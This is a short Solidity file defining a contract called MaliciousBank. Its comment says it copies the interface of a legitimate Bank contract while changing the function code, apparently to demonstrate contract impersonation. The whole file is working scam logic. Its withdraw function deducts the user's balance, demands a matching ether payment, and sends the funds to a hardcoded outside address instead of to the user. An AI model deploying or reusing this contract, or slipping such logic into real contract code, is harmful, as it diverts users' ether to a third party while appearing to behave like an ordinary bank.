// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/* ABI code is same as Bank contract
 * Function code is changed
 * In withdraw is user withdraws their eth their eth is never transferred to them but their balance mapping deducted
 */

contract MaliciousBank {
    mapping (address => uint) balance;
    
    fallback() external payable {}
    receive() external payable {}
    
    function deposit(address _sender, uint _amount) public payable {
        require(_sender != address(0));
        require(msg.value == _amount);
        balance[_sender] += _amount;
    }

    function withdraw(address _sender, uint _amount) public payable {
        require(_sender != address(0), "address 0");
        require(balance[_sender] != 0, "account empty");
        require(balance[_sender] >= _amount, "amount exceeds balance");
        require(msg.value == _amount);
        balance[_sender] -= _amount;
        (bool sent, ) = 0xdD870fA1b7C4700F2BD7f44238821C26f7392148.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    
}
